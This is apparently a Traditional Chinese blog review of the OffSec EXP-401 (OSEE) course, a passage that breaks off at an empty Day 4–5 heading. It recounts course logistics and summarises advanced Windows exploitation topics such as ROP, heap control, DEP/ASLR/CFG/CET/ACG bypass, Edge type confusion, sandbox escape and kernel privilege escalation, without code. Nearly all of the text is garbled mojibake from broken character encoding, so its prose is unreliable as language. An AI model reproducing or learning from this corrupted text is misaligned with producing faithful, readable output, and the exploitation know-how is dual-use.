&lt;p&gt;EXP-401ï¼ˆOSEEï¼‰æ˜¯ OffSec ä¸­å”¯ä¸€çš„ã€ŒExpertã€ç­‰ç´šèª²ç¨‹ï¼Œä¹Ÿæ˜¯å…¬èªæœ€å›°é›£ã€é€šéç‡æœ€ä½çš„è­‰ç…§ï¼Œå…·é«”å¯ä»¥åƒè€ƒ  Paul Jerimy æ•´ç†çš„ &lt;a href=&quot;https://pauljerimy.com/security-certification-roadmap/&quot;&gt;Security Certification Roadmap&lt;/a&gt; ï¼š
&lt;img src=&quot;/assets/img/blog/20250522/upload_8c455085eb6be1da05d6f11ed8b5ad8a.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;EXP-401ï¼ˆOSEEï¼‰é‡å°çš„æ˜¯&lt;strong&gt;é€²éš Windows æ¼æ´åˆ©ç”¨æŠ€è¡“&lt;/strong&gt;ï¼Œç”±æ–¼ç¾ä»£ Windows ç³»çµ±æœ‰è¨±å¤šå®‰å…¨é˜²ç¦¦æ©Ÿåˆ¶ï¼ˆåƒæ˜¯ DEPã€ASLRã€CFGã€ACGã€CET ç­‰ï¼‰ï¼Œèª²ç¨‹å°‡ä¸€æ­¥æ­¥å¸¶é ˜å­¸å“¡&lt;strong&gt;ç¹éé€™äº›é˜²ç¦¦æªæ–½&lt;/strong&gt;ï¼Œä¸¦é‡å°å–®ä¸€æˆ–å¤šé‡ä¿è­·ç’°å¢ƒï¼Œé–‹ç™¼å‡ºå¯¦éš›å¯è¡Œçš„ exploitã€‚èª²ç¨‹æœ‰å¹¾å€‹ç‰¹è‰²ï¼š&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;å¯¦é«”æˆèª²&lt;/strong&gt;ï¼šæ­¤èª²ç¨‹èˆ‡ OffSec çš„å…¶ä»–èª²ç¨‹éƒ½ä¸åŒï¼Œä¸¦æ²’æœ‰ç·šä¸Šèª²ç¨‹çš„æ–¹æ¡ˆï¼Œå› ç‚ºé€™å ‚èª²çš„è¬›å¸«éœ€è¦é€éèˆ‡å­¸å“¡å¤§é‡çš„äº’å‹•ä¾†é€²è¡ŒæŒ‡å°ï¼Œæ‰€ä»¥éœ€è¦å­¸å“¡åˆ°ç¾å ´ä¸Šèª²ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Real World å°å‘&lt;/strong&gt;ï¼šä¸Šèª²å…§å®¹æ˜¯ä»¥çœŸå¯¦ä¸–ç•Œä¼æ¥­æœƒæ¡ç”¨çš„å¤§å‹æ‡‰ç”¨ç¨‹å¼ä½œç‚ºåˆ†æå°è±¡ï¼Œä¾‹å¦‚ï¼šVMwareã€Edge ç­‰ç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;æ·±å…¥ Windows&lt;/strong&gt;ï¼šæ¶µè“‹ User Mode èˆ‡ Kernel Mode çš„æ¼æ´ç™¼æ˜èˆ‡åˆ©ç”¨ã€é€²éš Heap æ“ä½œã€VM Escapeã€Sandbox Escape èˆ‡ Kernel Driver çš„é€†å‘å’Œæ¼æ´åˆ†æç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;72 å°æ™‚è€ƒè©¦æŒ‘æˆ°&lt;/strong&gt;ï¼šOSEE æ˜¯ OffSec ä¸­è€ƒè©¦æ™‚é–“æœ€é•·çš„è­‰ç…§ã€‚è€ƒè©¦åƒ…æœ‰å…©é¡Œï¼Œçš†ç‚ºæœªçŸ¥æ¼æ´ï¼Œå­¸å“¡éœ€åœ¨ 72 å°æ™‚å…§é–‹ç™¼å‡ºå®Œæ•´çš„ exploit ä¸¦ç¹³äº¤ä¸€ä»½&lt;strong&gt;å®Œæ•´è©³ç›¡çš„æ»²é€æ¸¬è©¦å ±å‘Š&lt;/strong&gt;ï¼ŒåŒ…å«æ­¥é©Ÿèªªæ˜èˆ‡æˆªåœ–ã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;é›–ç„¶èª²ç¨‹å®˜ç¶²æ¨è–¦å­¸å“¡ç†Ÿæ‚‰ WinDBGã€IDA Proã€x86/x64 çµ„åˆèªè¨€ã€C/C++ï¼Œä½†ä¸Šå®Œèª²å¾Œï¼Œæˆ‘æ„Ÿè¦ºåªè¦æœƒé€™äº›æ±è¥¿çš„åŸºæœ¬æ“ä½œå°±å¯ä»¥äº†ã€‚å› ç‚ºèª²ç¨‹ä¸­ä¸¦æ²’æœ‰éæ–¼åˆé‘½çš„å ´æ™¯ï¼Œè€Œä¸”éœ€è¦é€²è¡Œé€†å‘å·¥ç¨‹çš„åœ°æ–¹éƒ½æ»¿å–®ç´”çš„ï¼Œæ•´å€‹èª²ç¨‹ä¹Ÿéƒ½ä¸éœ€è¦ä½¿ç”¨ IDA Pro çš„ decompile åŠŸèƒ½ã€‚æ•´é«”ä¾†èªªï¼Œé€™é–€èª²çš„é‡é»é‚„æ˜¯æ”¾åœ¨ &lt;strong&gt;exploit çš„æ’°å¯«èˆ‡æŠ€å·§æ‡‰ç”¨&lt;/strong&gt;ï¼Œè€Œéæ·±å…¥é€†å‘åˆ†æã€‚å› æ­¤ç›¸è¼ƒæ–¼ç´”é€†å‘æŠ€èƒ½ï¼Œæœ‰é &lt;strong&gt;binary exploitation ç¶“é©—ï¼ˆä¸è«–æ˜¯ Windows é‚„æ˜¯ Linuxï¼‰æœƒå°å­¸ç¿’éç¨‹æœ‰æ›´å¤§çš„å¹«åŠ©ã€‚&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;èª²ç¨‹å‰æº–å‚™&quot;&gt;èª²ç¨‹å‰æº–å‚™&lt;/h2&gt;

&lt;p&gt;åœ¨å ±åå®Œæˆå¾Œæœƒæ”¶åˆ° OffSec å¯„ä¾†çš„è¡Œå‰é€šçŸ¥ï¼Œå…§å®¹åŒ…å«äº†èª²ç¨‹çš„ç¡¬é«”èˆ‡è»Ÿé«”éœ€æ±‚ã€‚ä¾‹å¦‚ï¼Œç‚ºäº†ç¢ºä¿å­¸å“¡æœ‰è¾¦æ³•ç·´ç¿’åˆ°èª²å ‚ä¸Šæåˆ°çš„ä¿è­·ï¼Œæœƒéœ€è¦é›»è…¦æ”¯æ´ NXã€SMEP èˆ‡ VT-x/EPTã€‚è€Œä¸”å› ç‚ºèª²ç¨‹ä¸­æœ‰ VMware ç›¸é—œçš„å…§å®¹ï¼Œéœ€è¦å•Ÿç”¨å·¢ç‹€è™›æ“¬åŒ–ä¹‹å¤–é‚„è¦ç¢ºä¿ç¡¬ç¢Ÿç©ºé–“èˆ‡ RAM çš„å¤§å°è¶³å¤ ï¼ˆä¸éæ–°ç‰ˆçš„èª²ç¨‹ç§»é™¤ VMware äº†ï¼‰ã€‚æˆ‘å€‹äººæœƒæ¨è–¦å¦å¤–å¸¶ä¸€å€‹æ”œå¸¶å¼çš„å¤–æ¥è¢å¹•å»ä¸Šèª²ï¼Œå› ç‚ºåœ¨å°è™›æ“¬æ©Ÿé€²è¡Œ remote debugging çš„åŒæ™‚ï¼Œé‚„éœ€è¦çœ‹ä¸Šèª²ç°¡å ±æˆ–æ˜¯åœ¨ Visual Studio ä¸­ä¿®æ”¹ exploitï¼Œå¦‚æœä¸€ç›´åˆ‡ä¾†åˆ‡å»æ˜¯æœƒæ»¿åˆ†å¿ƒçš„ã€‚&lt;/p&gt;

&lt;p&gt;é™¤æ­¤ä¹‹å¤–ï¼Œè¡Œå‰é€šçŸ¥ä¸­é‚„åŒ…å«äº†å¾ˆå¤šèª²å‰æº–å‚™è³‡æ–™ï¼ŒåŒ…å«äº†å¾ˆå¤šä¸Šèª²ä¸­æœƒæåˆ°çš„æ¦‚å¿µä»¥åŠæ‰‹æ³•çš„ç²—æ·ºä»‹ç´¹ï¼Œè«¸å¦‚ï¼šBypassing DEPã€Bypassing ASLRã€Bypassing CFGã€Windows Mitigations Improvementsã€Type Confusion Vulnerabilitiesã€SMEPã€Token Stealingã€Low Fragmentation Heap ç­‰ç­‰å„ç¨®äº‹å‰é ç¿’è³‡æ–™ã€‚&lt;/p&gt;

&lt;h2 id=&quot;ä¸Šèª²ç‹€æ³&quot;&gt;ä¸Šèª²ç‹€æ³&lt;/h2&gt;

&lt;p&gt;é€™æ¬¡èª²ç¨‹æ˜¯é€£çºŒäº”å¤©çš„å¯¦é«”èª²ç¨‹ï¼Œæ¯å¤©å¾æ—©ä¸Š 9:00 ä¸Šåˆ°æ™šä¸Š 18:00ï¼Œä¸Šèª²åœ°é»åœ¨åŒ—ç§‘å¤§çš„é›†æ€æœƒè­°ä¸­å¿ƒã€‚ä¸€èµ°é€²æ•™å®¤å°±çœ‹åˆ°æ¡Œä¸Šæ“ºè‘—ä¸€æœ¬è¶…å¤§çš„èª²æœ¬ã€‚
&lt;img src=&quot;/assets/img/blog/20250522/upload_ab82acf8bee146b377b3bc70ff60b756.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€™æœ¬èª²æœ¬åˆ°åº•æœ‰å¤šå¤§å‘¢ï¼Ÿå…§å®¹å¤§ç´„å…­ç™¾é ï¼Œåšåº¦å¤§ç´„ 3.6 å…¬åˆ†ï¼š
&lt;img src=&quot;/assets/img/blog/20250522/upload_17fdc7d6f806d28d3cb313584b4fe4ec.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç°¡å–®ä¾†èªªï¼Œå°±æ˜¯æœ‰å¤ å¤§æœ¬ã€‚&lt;/p&gt;

&lt;p&gt;ä¸Šèª²æœŸé–“ï¼Œæ¯å¤©éƒ½æœ‰æä¾›å„ç¨®é£Ÿç‰©å’Œé»å¿ƒï¼Œé™¤äº†å­¸ç¿’ä»¥å¤–çš„äº‹æƒ…ä¸€å¾‹éƒ½ä¸éœ€è¦æ“”å¿ƒã€‚é€™æ¬¡çš„è¬›å¸«æ˜¯ &lt;a href=&quot;https://dz.linkedin.com/in/nassereddine-abdelli?trk=public_post_feed-actor-name&quot;&gt;Nassereddine ABDELLI&lt;/a&gt;ï¼ˆ&lt;a href=&quot;https://x.com/n4sr0&quot;&gt;@n4sr0&lt;/a&gt;ï¼‰èˆ‡ &lt;a href=&quot;https://lb.linkedin.com/in/victor-khoury&quot;&gt;Victor Khoury&lt;/a&gt;ï¼ˆ&lt;a href=&quot;https://github.com/V-i-x-x&quot;&gt;Vixx&lt;/a&gt;ï¼‰ï¼Œå…©ä½è¬›å¸«éƒ½éå¸¸çš„æœ‰ç¶“é©—ï¼Œè·Ÿå­¸å“¡çš„äº’å‹•éå¸¸çš„å¤šï¼Œæ™‚å¸¸æœƒæ‹‹å‡ºå•é¡Œä¾†ç¢ºèªå­¸å“¡æ˜¯ä¸æ˜¯éƒ½æœ‰ç†è§£èª²ç¨‹é€²åº¦ã€‚å³ä½¿å­¸å“¡å•ä¸€äº›è¬›å¸«æ²’æœ‰é æœŸåˆ°çš„å•é¡Œï¼Œä»–å€‘ä¹Ÿéƒ½èƒ½ç•¶å ´å¯¦éš›æ“ä½œä¸¦è§£ç­”ï¼Œé©—è­‰ä¸¦å›ç­”å­¸å“¡çš„å•é¡Œï¼Œå®Œå…¨ç™¼æ®äº† Live Training çš„å„ªé»ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨äº”å¤©çš„èª²ç¨‹ä¸­ï¼Œé‚„è¨­è¨ˆäº†å¹¾å€‹åç‚º Extra Miles çš„æŒ‘æˆ°ï¼Œåªè¦èƒ½åœ¨ Live Training æœŸé–“å®Œæˆï¼Œå°±èƒ½ç²å¾—ä¸€æš Challenge Coinï¼Œç¸½å…±æœ‰å…©å€‹é€™æ¨£çš„ Challengeã€‚èª²å ‚ä¸Šä¹Ÿæœ‰ä¸€äº›å°å‹å•ç­”æ´»å‹•ï¼Œç­”å°çš„è©±å¯ä»¥æ‹¿åˆ°è²¼ç´™ã€‚&lt;/p&gt;

&lt;p&gt;æœ‰è¶£çš„æ˜¯ï¼Œåœ¨ç¬¬ä¸€å¤©å¿«è¦çµæŸçš„æ™‚å€™ï¼Œè¬›å¸«å¥½åƒå¿ƒè¡€ä¾†æ½®è‡ªå·±å¢åŠ äº†ä¸€å€‹ challengeï¼š45 åˆ†é˜å…§æˆåŠŸæå®š ROP chain ï¼Œå°±èƒ½æ‹¿åˆ° Challenge Coinã€‚ä¸éï¼Œå› ç‚ºæ™‚é–“å¤ªè¶•äº†æ²’æœ‰äººå®Œæˆã€‚ç•¶æ™‚ Orange é‚„æ˜¯ Lays å°±é–‹ç©ç¬‘çš„èªªï¼šã€Œå¹¾ä¹å…¨å°ç£çš„å¾®è»Ÿç™¾å¤§é§­å®¢éƒ½åœ¨é€™è£¡äº†ï¼Œç«Ÿç„¶æ²’äººè§£å¾—å‡ºä¾†ã€‚ã€çœ‹ä¾† OSEE æ˜¯çœŸé›£ã€‚&lt;/p&gt;
&lt;h3 id=&quot;day-1&quot;&gt;Day 1&lt;/h3&gt;

&lt;p&gt;ç¬¬ä¸€å¤©ä¸Šèª²è¬›å¸«å…ˆæŠŠæŠ•å½±ç‰‡é‚„æœ‰ä¸€å †ä¸Šèª²æœƒç”¨åˆ°çš„ VM å…ˆå‚³çµ¦å¤§å®¶ï¼Œç„¶å¾Œé–‹å§‹å°èª²ç¨‹åšç°¡å–®çš„ä»‹ç´¹ã€‚ç¶²è·¯ä¸Šæœ€å¤šäººæåˆ°çš„æ‡‰è©²å°±æ˜¯é€™ä¸€å¼µæŠ•å½±ç‰‡ï¼š
&lt;img src=&quot;/assets/img/blog/20250522/upload_7b077d2f6c8d86426a5aa31a1876449b.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€™å¼µæŠ•å½±ç‰‡é å‘Šäº†æ¥ä¸‹ä¾†èª²ç¨‹é›£åº¦æ˜¯æ€æ¨£è·³èºçš„ï¼Œä½†æˆ‘å€‹äººè¦ºå¾—æ²’æœ‰é€™éº¼èª‡å¼µï¼Œå¯èƒ½æ˜¯å› ç‚ºèª²ç¨‹è£¡çš„ä¸»é¡Œæœ¬ä¾†å°±æ˜¯æ¼æ´ç ”ç©¶å“¡å¹³å¸¸æœƒç¢°åˆ°çš„æ±è¥¿ï¼ˆVMã€Browserã€Kernelï¼‰ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯å› ç‚º CTF é¸æ‰‹æœ¬ä¾†æ¯”è¼ƒè€æ“ã€‚&lt;/p&gt;

&lt;p&gt;ä¸€å€‹æ¯”è¼ƒæœ‰è¶£çš„å°å½©è›‹æ˜¯ï¼ŒæŠ•å½±ç‰‡ä¸Šæ–¹ç•«äº†ä¸€å€‹æ—¥æœ¬æ­¦å£«ï¼Œéš¨è‘—èª²ç¨‹çš„é€²è¡Œï¼Œæ­¦å£«çš„è£å‚™æœƒè¶Šä¾†è¶Šé™ç´šã€‚ä¾‹å¦‚ï¼Œé ­ç›”æœƒè®Šæˆæ–—ç¬ ï¼Œæ­¦å™¨è·Ÿé§ç”²ä¹Ÿæœƒæ…¢æ…¢æ¶ˆå¤±ï¼Œæœ€å¾Œæœƒè®Šæˆä¸€å€‹è£¸ç”·ã€‚æ‡‰è©²æ˜¯å¯“æ„è‘—ç†è§£ Windows çš„éç¨‹å°‡æœƒå……æ»¿æŒ‘æˆ°ï¼&lt;/p&gt;

&lt;p&gt;é›–ç„¶èª²ç¨‹æœ¬ä¾†å°±å»ºè­°è¦å…·å‚™ä¸€å®šçš„ Windows ç›¸é—œçŸ¥è­˜ï¼Œä½†é‚„æ˜¯ä¸å…ä¿—çš„å…ˆè¬›äº†ä¸€äº›ç°¡å–®çš„æ±è¥¿æš–æš–èº«ï¼Œå¦‚ Win32 API è·Ÿ x64 shellcode ç›¸é—œçš„å…§å®¹ã€‚ä½†æ˜¯ä¸‹åŠå¤©é–‹å§‹å°±æ…¢æ…¢é€²å…¥ VMware çš„å…§å®¹äº†ã€‚é¦–å…ˆä»‹ç´¹äº†ä¸€äº›åŸºç¤çš„é˜²è­·æ©Ÿåˆ¶ä»¥åŠå¦‚ä½•ç”¨ ROP ç¹éé€™äº›ä¿è­·ï¼Œæ¥è‘—æœƒä»‹ç´¹ VMware Workstation çš„ä¸€äº›å…§éƒ¨é‹ä½œæ©Ÿåˆ¶é‚„æœ‰çµæ§‹ã€‚&lt;/p&gt;

&lt;p&gt;é€™éƒ¨åˆ†è®“æˆ‘å°è±¡å¾ˆæ·±åˆ»çš„æ˜¯ï¼Œå¾è¬›ç¾©å…§å®¹å¯ä»¥çœ‹å¾—å‡ºä¾†ï¼Œç·¨å¯«é€™æœ¬è¬›ç¾©çš„åœ˜éšŠæ˜¯ä¸€ç¾¤å¾ˆæœ‰æ°´æº–çš„ç ”ç©¶å“¡ã€‚è¬›ç¾©å°±æ˜¯é€™äº›ç ”ç©¶å“¡ç´°å¿ƒç ”ç©¶ã€æ•´ç†å¾Œç”¢å‡ºçš„çµæ™¶ï¼Œå› æ­¤èª²æœ¬è£¡é¢å……æ»¿äº†å„ç¨® Referenceã€‚å¦‚æœå°åŸå§‹ç ”ç©¶æœ‰æ›´å¤šèˆˆè¶£ï¼Œåªè¦é †è‘—è¬›ç¾©æä¾›çš„åƒè€ƒè³‡æ–™ï¼Œå°±èƒ½å¾ˆå®¹æ˜“æ‰¾åˆ°æ›´æ·±å…¥çš„é–±è®€ææ–™ã€‚&lt;/p&gt;

&lt;h3 id=&quot;day-2&quot;&gt;Day 2&lt;/h3&gt;

&lt;p&gt;ç¬¬äºŒå¤©æŒçºŒ VMware Workstation çš„èª²ç¨‹ï¼Œå› ç‚ºèª²å ‚ä¸Šçš„ä¾‹å­æ˜¯èˆ‡ Heap ç›¸é—œçš„æ¼æ´ï¼Œæ‰€ä»¥å…ˆèŠ±äº†ä¸€é»ç¯‡å¹…ä»‹ç´¹ Windows Heap çš„æ•´é«”æ¶æ§‹ï¼Œç‚ºå¾ŒçºŒæ’°å¯« exploit æ‰“å¥½åŸºç¤ï¼Œå±†æ™‚å¯ä»¥æ›´å¥½çš„æ§åˆ¶ Heapã€‚&lt;/p&gt;

&lt;p&gt;æ¥è‘—èª²ç¨‹é€²å…¥ Bypassing ASLRã€Stack Pivotingã€Defeating DEP ç­‰ç­‰å…§å®¹ã€‚å¾é€™è£¡é–‹å§‹ï¼Œå¯ä»¥æ˜é¡¯æ„Ÿå—åˆ°é€™é–€èª²çš„å¯¦ç”¨åƒ¹å€¼ã€‚é€šå¸¸åœ¨ CTF æ¯”è³½ä¸­ï¼Œæˆ‘å€‘åªåœ¨ä¹èƒ½ä¸èƒ½æ‹¿åˆ° Flagï¼Œä¸ç‰¹åˆ¥è¿½æ±‚ exploit çš„ç©©å®šæ€§ï¼›åœ¨  Pwn2Own ç­‰æ¯”è³½ä¸­ï¼Œé‡é»å‰‡æ˜¯èƒ½ä¸èƒ½ç©©å®šå–å¾— Shellï¼Œåªè¦ã€ŒOne Shotã€å³å¯ï¼Œå¾ŒçºŒç³»çµ±æœƒä¸æœƒ crash ä¸¦ä¸æ˜¯å¤ªå¤§å•é¡Œã€‚ä½†åœ¨é€™é–€èª²ä¸­ï¼Œå­¸å“¡æœƒè¢«è¦æ±‚è¦æŠŠç¨‹å¼å›å¾©åˆ°æ­£å¸¸çš„ç‹€æ…‹ã€‚ä¹Ÿå°±æ˜¯èªªï¼Œç„¡è«–æ˜¯ VMware Workstation èˆ‡ Windows ï¼Œåœ¨ exploit åŸ·è¡Œå®Œä¹‹å¾Œéƒ½ä¸èƒ½å‡ºç¾ crash æˆ–ç•¶æ©Ÿï¼Œå¿…é ˆåƒä»€éº¼äº‹éƒ½æ²’ç™¼ç”Ÿéä¸€æ¨£ç¹¼çºŒé‹ä½œã€‚ï¼ˆç•¶ç„¶ï¼Œä¸æ¥å—ä½¿ç”¨ while loop æˆ– sleep å¡ä½ç¨‹å¼ä¾†ã€Œä½œå¼Šã€ï¼‰&lt;/p&gt;

&lt;p&gt;ä¸‹åŠå¤©ï¼Œå…§å®¹é€æ¼¸é€²å…¥åˆ° Edge Browser çš„éƒ¨åˆ†ã€‚ä¸éé€™é‚Šæ•™çš„é‚„æ˜¯ Chakra ç‰ˆæœ¬çš„ Edgeï¼Œè€Œä¸æ˜¯ç¾è¡Œçš„ Chromium ç‰ˆæœ¬ã€‚è¬›å¸«æåˆ°ï¼Œé¸æ“‡ Chakra ç‰ˆæ˜¯å› ç‚ºé€™å€‹ç‰ˆæœ¬å•Ÿç”¨äº†æ›´å¤š Windows åŸç”Ÿçš„ä¿è­·æ©Ÿåˆ¶ï¼Œé¸æ“‡èˆŠç‰ˆçš„ Edge åè€Œå¯ä»¥ç·´ç¿’åˆ°æ›´å¤š Windows çš„ exploit æŠ€å·§ï¼Œæ›´ç¬¦åˆé€™é–€èª²ã€ŒAdvanced Windows Exploitationã€çš„å®šä½ã€‚å¯¦éš›ä¸Šè¦åœ¨é€™é–€èª²ä¸­çœŸæ­£å­¸å¥½ Browser pwn ç¢ºå¯¦ä¹Ÿæ˜¯ä¸å¯èƒ½çš„ï¼Œè¦æƒ³è¿½ä¸Šæœ€æ–°ç‰ˆçš„ç´°ç¯€æˆ–æ¼æ´ç ”ç©¶è¶¨å‹¢ï¼Œé‚£æœƒæ˜¯å¦ä¸€å€‹é¾å¤§åˆ°å¯ä»¥é–‹æˆä¸€æ•´é–€èª²çš„ä¸»é¡Œï¼Œä¸æ˜¯ Advanced Windows Exploitation é€™é–€èª²éœ€è¦è¿½æ±‚çš„ã€‚ä½†å³ä¾¿å¦‚æ­¤ï¼Œæˆ‘å€‘é‚„æ˜¯å­¸åˆ°äº†è¨±å¤šé—œæ–¼ Browser Exploit çš„æ ¸å¿ƒæ¦‚å¿µï¼Œä¾‹å¦‚ Type Confusionã€&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addressof&lt;/code&gt;ã€&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fakeobj&lt;/code&gt; ç­‰æŠ€å·§ï¼Œä»¥åŠé‡è¦çš„ Debugging æµç¨‹ã€‚&lt;/p&gt;

&lt;p&gt;é›–ç„¶ Browser çš„éƒ¨åˆ†é‚„æ²’é–‹å§‹å¤ªå¤šï¼Œä½†ä»Šå¤©è¬›å¸«é‚„æ˜¯çµ¦äº†ç¬¬ä¸€å€‹ Extra Mileï¼š&lt;strong&gt;ä½¿ç”¨ ROP ç¹é CFGï¼ˆControl Flow Guardï¼‰ä¿è­·ï¼Œå®Œæˆ Sandbox Escape çš„ exploit&lt;/strong&gt;ï¼ˆèª²å ‚ä¸Šæ•™æ˜¯ CETï¼ˆControl-Flow Enforcement Technologyï¼‰å•Ÿç”¨çš„æƒ…å¢ƒï¼Œå±†æ™‚é€£ ROP éƒ½ç„¡æ³•æˆåŠŸï¼‰ã€‚è½èµ·ä¾†å¾ˆç°¡å–®ï¼Œä½†è¬›å¸«é‚„ç‰¹åˆ¥è¦æ±‚ï¼Œæˆ‘å€‘å¿…é ˆæŠŠæ¼æ´åŒ…è£æˆä¸€å€‹å¯ä»¥ç„¡é™æ¬¡è§¸ç™¼ ROP çš„ functionï¼Œè®“ exploit é–‹ç™¼éç¨‹æ›´åŠ æœ‰ç´€å¾‹ï¼Œä¹Ÿèƒ½æå‡é–‹ç™¼æ•ˆç‡ã€‚&lt;/p&gt;

&lt;p&gt;ç•¶ç„¶ï¼Œé€™ä¸­é–“é‚„æœ‰å…¶ä»–é›£é»éœ€è¦è§£æ±ºï¼Œåƒæ˜¯å¦‚ä½•å–å¾—å¯ç”¨çš„è¨˜æ†¶é«”ä½ç½®ç­‰ç­‰ã€‚ä½†æ˜¯å› ç‚ºæˆ‘çœŸçš„å¾ˆæƒ³æ‹¿åˆ° Challenge Coinï¼Œæ‰€ä»¥æˆ‘ä¸€å€‹æ™šä¸Šçœ‹äº†ä¸€å…©ç™¾é é‚„æ²’æœ‰æ•™åˆ°çš„åœ°æ–¹ï¼Œå…ˆæŠŠè¦åšä»€éº¼äº‹æƒ…é‡æ¸…ä¹‹å¾Œå°±é–‹å§‹å¯«é€™å€‹ exploitã€‚&lt;/p&gt;

&lt;h3 id=&quot;day-3&quot;&gt;Day 3&lt;/h3&gt;

&lt;p&gt;ç¬¬ä¸‰å¤©çš„èª²ç¨‹æ•´å¤©éƒ½èšç„¦åœ¨ Edge ä¸Šï¼Œé€™æ˜¯æˆ‘è¦ºå¾—é€™é–€èª²æœ€æœ‰è¶£çš„éƒ¨åˆ†ã€‚&lt;/p&gt;

&lt;p&gt;å¾ Type Confusion æ¼æ´é–‹å§‹ï¼Œè¬›å¸«å¸¶æˆ‘å€‘ä¸€æ­¥æ­¥é€éæ“æ§ Edge ä¸­çš„ Javascript ç‰©ä»¶ä¾†æ§åˆ¶ RIPã€‚æ¥è‘—ï¼Œèª²ç¨‹é€²å…¥å„ç¨®é˜²è­·æ©Ÿåˆ¶çš„ä»‹ç´¹ï¼Œæ¯å•Ÿç”¨ä¸€ç¨®æ–°é˜²è­·ï¼Œå°±é¦¬ä¸Šæ•™æˆ‘å€‘æ€éº¼è¨­æ³•ç¹éå®ƒã€‚æˆ‘å€‘å…ˆæ˜¯ç¹é CFGï¼ˆControl Flow Guardï¼‰ï¼Œæ¥è‘— Control-Flow Enforcement Technologyï¼ˆCETï¼‰ï¼Œæ¥è‘— Arbitrary Code Guardï¼ˆACGï¼‰ï¼Œæœ€å¾Œå‰‡æ˜¯å¾ Browser çš„ä½æ¬Šé™ Sandbox é€ƒè„«åˆ° Windows åŸ·è¡Œé«˜æ¬Šé™çš„æŒ‡ä»¤ã€‚&lt;/p&gt;

&lt;p&gt;éç¨‹ä¸­ä¸åªå­¸ç¿’çš„ç¾ä»£ Windows å­˜åœ¨æ€æ¨£çš„ä¿è­·æ©Ÿåˆ¶ä¹‹å¤–ï¼Œå°æ¯ç¨®ä¿è­·æ©Ÿåˆ¶çš„å±€é™æ€§ä»¥åŠç¹éæ‰‹æ³•ä¹Ÿæœ‰å¾ˆæ·±åˆ»çš„èªè­˜ï¼&lt;/p&gt;

&lt;p&gt;ç•¶ç„¶ï¼Œé›–ç„¶ä¸Šèª²å…§å®¹è·Ÿ Extra Mile èµ°çš„è·¯ç·šä¸å®Œå…¨ç›¸åŒï¼Œæˆ‘é‚„æ˜¯åœ¨èª²å ‚é€²è¡Œä¸­å®Œæˆäº†é‚£å€‹ ROP Sandbox Escape çš„ Extra Mileï¼Œé †åˆ©æ‹¿åˆ°äº†é€™æ¬¡èª²ç¨‹ç™¼å‡ºçš„&lt;strong&gt;ç¬¬ä¸€æš Challenge Coin&lt;/strong&gt;ï¼é›–ç„¶é€™ç·¨è™Ÿçœ‹èµ·ä¾†æœ‰é»ä¸å‰åˆ©ï¼ˆChallenge Coin æ²’æœ‰æŒ‰ç…§ç·¨è™Ÿé †åºç™¼ï¼‰ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250522/upload_83ad2122816ba37db84d7750df28350a.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ä»Šå¤©ä¸‹èª²ä¹‹å‰ï¼Œè¬›å¸«ä¹Ÿçµ¦å‡ºäº†é€™é–€èª²æœ€å¾Œä¸€å€‹ Extra Mile æŒ‘æˆ°ï¼Œé€™æ¬¡æ˜¯è·Ÿå¾Œé¢å³å°‡ä¸Šåˆ°çš„ Kernel Mode èª²ç¨‹å…§å®¹æœ‰é—œï¼šåœ¨ Low Integrity çš„æƒ…å¢ƒä¸‹å®ŒæˆæŸå€‹ CVE çš„æ¼æ´åˆ©ç”¨æœ€å¾ŒåŸ·è¡Œé«˜æ¬Šé™çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmd.exe&lt;/code&gt;ã€‚&lt;/p&gt;

&lt;p&gt;é€™é‚Šçš„é›£é»åœ¨æ–¼å› ç‚ºæ˜¯ Low Integrity æ‰€ä»¥ç„¡æ³•ç›´æ¥ä½¿ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtQuerySystemInformation&lt;/code&gt; ä¾†æ´©æ¼ Windows Kernel çš„è¨˜æ†¶é«”ä½ç½®ï¼Œéœ€è¦é€éå…¶ä»–æ¼æ´ä¾†è¿‚è¿´çš„å–å¾—æˆ‘å€‘æƒ³è¦çš„ Kernel è¨˜æ†¶é«”ä½ç½®ã€‚è€Œä¸”ï¼Œç”±æ–¼èª²å ‚ä¸­çµ¦çš„ CVE éœ€è¦å¯«æª”æ¡ˆæ‰èƒ½å®Œæˆæ¼æ´åˆ©ç”¨ï¼Œæˆ‘å€‘é‚„éœ€è¦æ‰¾ä¸€å€‹ Low Integrity ä¹Ÿèƒ½å¯«å…¥çš„è³‡æ–™å¤¾æ‰èƒ½é †åˆ©æ”¾ç½® exploit æ‰€éœ€çš„æª”æ¡ˆä¸¦å®Œæˆåˆ©ç”¨ã€‚&lt;/p&gt;

&lt;h3 id=&quot;day-45&quot;&gt;Day 4ã€5&lt;/h3&gt;

